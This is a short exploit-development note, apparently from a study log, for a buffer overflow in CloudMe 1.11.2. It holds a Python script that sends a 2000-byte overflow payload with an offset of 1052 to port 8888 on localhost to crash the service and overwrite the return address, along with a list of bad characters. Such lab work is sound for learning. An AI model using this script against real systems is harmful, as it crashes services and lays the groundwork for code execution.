# CloudMe 1.11.2

Downloaded from: https://www.exploit-db.com/apps/f0534b12cd51fefd44002862918801ab-CloudMe_1112.exe

## Initial Crash
```py
from struct import pack
import socket

#\x00\x0A\x0D

TARGET_IP = "127.0.0.1"
TARGET_PORT = 8888
target = (TARGET_IP, TARGET_PORT)  # vulnserver


crash = 2000  # change me
offset = 1052


payload = b"A"*offset
payload += b"B"*4
payload += b"C"*(crash - len(payload))

with socket.create_connection(target) as sock:

    sent = sock.send(payload)
    print(f"sent {sent} bytes")
 ```
